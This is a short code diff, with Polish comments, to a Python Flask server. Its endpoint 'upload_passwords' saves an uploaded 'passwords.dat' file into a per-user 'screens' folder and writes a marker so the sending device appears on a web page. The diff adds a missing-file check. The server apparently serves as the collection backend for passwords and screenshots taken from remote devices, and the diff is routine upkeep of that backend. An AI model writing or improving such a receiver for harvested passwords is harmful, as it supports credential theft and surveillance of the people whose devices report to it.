@@ -180,18 +180,18 @@ def upload_passwords():
     folder = os.path.join("screens", user)
     os.makedirs(folder, exist_ok=True)
 
+    if 'data' not in request.files:
+        return "Brak pliku 'data'", 400
+
     file = request.files['data']
     filepath = os.path.join(folder, "passwords.dat")
     file.save(filepath)
 
-    # marker plik, żeby urządzenie pojawiło się na stronie
+    # marker by urządzenie było widoczne
     with open(os.path.join(folder, "received_passwords.txt"), "w") as f:
         f.write(datetime.now().isoformat())
 
     return "OK"
-
-
-
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
